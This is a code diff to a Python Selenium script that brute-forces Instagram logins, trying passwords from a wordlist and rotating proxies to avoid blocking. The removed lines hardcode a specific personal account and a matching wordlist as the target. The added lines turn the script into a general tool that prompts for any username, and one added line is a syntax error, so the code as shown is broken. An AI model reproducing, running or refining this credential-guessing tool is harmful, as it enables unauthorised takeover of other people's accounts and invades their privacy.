@@ -1,9 +1,11 @@
 from selenium import webdriver
 import time
 import random
-chrome_options = webdriver.ChromeOptions()
 
-driver =webdriver.Chrome(executable_path="/home/kushal/everything/insta-brute/chromedriver",chrome_options=chrome_options)
+username = input("enter username:")
+chrome_options = webdriver.ChromeOptions()
+exe_path-="put yer chromdriver path here"
+driver =webdriver.Chrome(executable_path=exe_path,chrome_options=chrome_options)
 url='https://www.instagram.com/accounts/login/?force_classic_login'
 proxies = open("proxies.txt","r")
 proxy_list =[]
@@ -35,11 +37,11 @@ def login(username,password):
 
 #goto dms
 #driver.find_element_by_xpath("/html/body/div[1]/section/nav/div[2]/div/div/div[3]/div/div[2]/a").click()
-
-passlist = open("mikhil.txt","r")
+wordlist="path to yer wordlist"
+passlist = open(wordlist,"r")
 attempt =1
 for password in passlist:
     print(f"\n[+]attempt:{attempt} trying:{password}")
-    login("mikhil_shivaraman",password)
+    login(username,password)
     attempt+=1
     
